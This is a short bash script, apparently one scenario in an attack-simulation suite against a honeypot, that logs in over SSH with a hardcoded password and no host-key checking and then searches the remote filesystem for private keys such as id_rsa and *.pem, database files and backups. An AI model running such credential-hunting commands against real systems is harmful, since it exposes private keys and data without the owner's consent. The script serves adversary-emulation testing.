#!/usr/bin/env bash
# S28 — Sensitive File Search
# Tactic : Collection (TA0009)
# Technique: T1005 Data from Local System
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S28 Sensitive File Search — ${TARGET} ==="
$SSH "find / -name '*.pem' -o -name '*.key' -o -name 'id_rsa' 2>/dev/null | head -10; find / -name '*.db' -o -name '*.sqlite' 2>/dev/null | head -10; find / -name 'backup*' -o -name '*.bak' 2>/dev/null | head -5" && echo "[OK]" || echo "[FAIL]"
